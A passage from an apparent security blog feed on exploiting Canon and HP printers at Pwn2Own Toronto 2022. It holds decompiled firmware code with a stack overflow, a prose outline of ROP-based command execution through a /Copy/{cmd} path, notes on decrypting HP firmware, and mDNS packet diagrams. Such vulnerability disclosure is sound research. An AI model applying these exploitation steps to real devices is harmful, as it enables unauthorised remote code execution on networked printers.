  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-D8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-B8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+48h] [bp-98h] BYREF&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/UserReadyToScan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/Jobs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xAu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_37:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x411FA215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//------------------------------------------------------ [2]  &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Pages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword_5DBC8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_scan_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rest_scan_vp_thread_created&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_err_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但當在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; 處理 pathinfo 時，並沒有檢查長度，並且直接複製到 local buffer(first_path_info[32]) 中，導致 stack overflow。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;我們可以構造很長的 request 到 /Scan/Jobs/ 來觸發漏洞，並且該處沒有 Stack Guard 也沒有 ASLR，可以直接覆蓋 return address，這邊只需要做 ROP 覆蓋掉 strncmp 的 GOT 到 system 後，就可以透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Copy/{cmd}&lt;/code&gt; 來執行任意指令了。&lt;/p&gt;

&lt;p&gt;不過最終這個漏洞與其他隊伍撞洞了。&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;從 Pwn2Own Austin 2021 到 Pwn2Own Toronto 2022 的結果看下來，印表機安全依舊是容易被忽略的，短短一年間，能打下印表機的隊伍也大幅增加，甚至到第三年 &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2023/10/23/pwn2own-toronto-2023-the-schedule&quot;&gt;Pwn2Own Toronto 2023&lt;/a&gt; 也還是被許多隊伍找到漏洞，最後也建議大家如果有使用到這些 IoT 設備，盡量把不必要的服務關閉並且設好防火牆及做好權限控管，以減少被攻擊的可能。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/</link>
                <guid>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2</guid>
                <pubDate>Mon, 06 Nov 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hacking Printers at Pwn2Own Toronto 2022&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Based on our &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;previous research&lt;/a&gt;, we also discovered Pre-auth RCE vulnerabilities(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-553/&quot;&gt;(CVE-2023-0853&lt;/a&gt;、&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-554/&quot;&gt;CVE-2023-0854&lt;/a&gt;) in other models of Canon printers. For the HP vulnerability, we had a collision with another team. In this section, we will detail the Canon and &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-35178&quot;&gt;HP vulnerabilities&lt;/a&gt; we exploited during Pwn2own Toronto.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pwn2Own Toronto 2022 Target&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Target&lt;/th&gt;
      &lt;th&gt;Price&lt;/th&gt;
      &lt;th&gt;Master of Pwn Points&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HP Collor LaserJet Pro M479fdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Lexmark MC3224i&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Canon imageCLASS MF743Cdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;
&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;

&lt;p&gt;Same as 2021, you can refer to &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;Part I&lt;/a&gt;. The current version is v11.04.&lt;/p&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;The firmware can be obtained from HP’s official &lt;a href=&quot;https://ftp.ext.hp.com/pub/networking/software/pfirmware/pfirmware.glf&quot;&gt;website&lt;/a&gt;. However, unlike in 2021, it cannot be directly extracted using binwalk. The firmware is encrypted with AES, and it’s hard to decrypt directly from the information.&lt;/p&gt;

&lt;p&gt;At first, our thought was to look for the firmware of the same series to see if there was an unencrypted version. However, there was no such firmware on HP’s official website that met our criteria. We initially considered tearing down the printer to dump the firmware, but during our search on Google, we stumbled upon an older mirror site. This site enabled directory listing, allowing us to access all the firmware stored on that mirror website.&lt;/p&gt;

&lt;p&gt;However, the problem was that the mirror site only mirrored up to 2016 and didn’t have the latest information. Still, we later managed to glean the official directory structure from the website information, which helped us to obtain an unencrypted firmware from a similar series.”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After our analysis, we found decryption-related information in the Firmware from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fwupd&lt;/code&gt;. By reverse engineering, we were able to identify the encryption method and the Key. We can use the key to decrypt the target version of the Firmware.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;hp-collor-laserjet-pro-m479fdw&quot;&gt;HP Collor LaserJet Pro M479fdw&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;OS - Linux Base&lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability--exploitation&quot;&gt;Vulnerability &amp;amp; Exploitation&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;mdns-cve-2023-0853&quot;&gt;mDNS (CVE-2023-0853)&lt;/h4&gt;
&lt;p&gt;Ｗe found a stack overflow on mDNS. mDNS protocol resolves hostnames to IP address within small networks that do not include a local name server and are usually used for Apple and IoT devices.&lt;/p&gt;

&lt;p&gt;It is enabled on Canon ImageCLASS MF743Cdw(Version 11.04) by default.&lt;/p&gt;

&lt;p&gt;Before we look at the detail of the vulnerability we need to talk about mDNS Packet Structure.&lt;/p&gt;

&lt;p&gt;mDNS is based on the DNS packet format defined in RFC1035 Section 4 for both queries and responses. mDNS queries and responses utilize the DNS header format defined in RFC1035 with exceptions noted below:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +---------------------+
    |        Header       |
    +---------------------+
    |       Question      | the question for the name server
    +---------------------+
    |        Answer       | RRs answering the question
    +---------------------+
    |      Authority      | RRs pointing toward an authority
    +---------------------+
    |      Additional     | RRs holding additional information
    +---------------------+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;The header contains the following fields:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer section contains RRs that answer the question.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource record format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

